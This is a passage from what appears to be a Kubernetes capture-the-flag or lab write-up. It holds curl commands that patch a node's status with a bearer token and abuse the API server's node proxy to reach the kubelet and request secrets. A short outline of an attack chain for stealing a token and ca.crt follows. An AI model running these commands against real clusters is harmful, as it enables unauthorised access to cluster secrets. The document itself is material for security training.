  "${NODE}-orig.json" > "${NODE}-patched.json"

# Update node status
curl -k \
  -H "Authorization: Bearer ${BEARER_TOKEN}" \
  -H "Content-Type: application/merge-patch+json" \
  -X PATCH \
  -d "@${NODE}-patched.json" \
  "https://${API_SERVER_IP}:${API_SERVER_PORT}/api/v1/nodes/${NODE}/status"

# Access kubelet via API server node proxy
curl -kv \
  -H "Authorization: Bearer ${BEARER_TOKEN}" \
  "https://${API_SERVER_IP}:${API_SERVER_PORT}/api/v1/nodes/${NODE}/proxy/api/v1/secrets"
EOF

```

First explore the registries. Then get infomation from an interseting image. Get the source code and find a `bug` in it. Then try to abuse the proxy to get token and `ca.crt`. Use the token to create a secret. Exploit a issue in k8s.
